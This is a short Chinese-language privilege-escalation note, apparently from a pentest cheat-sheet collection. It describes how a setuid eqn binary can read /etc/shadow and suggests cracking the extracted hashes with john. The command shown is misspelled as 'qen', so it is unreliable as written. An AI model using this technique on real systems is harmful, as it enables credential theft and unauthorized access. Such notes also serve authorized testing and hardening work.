# eqn

`eqn` 若具有 `s` 权限，可以被用来读取一些高权限文件的内容，例如`/etc/shadow`

使用如下命令读取`/etc/shadow` 的内容：

```
qen /etc/shadow
```


然后使用`john` 对 hash 进行破解.
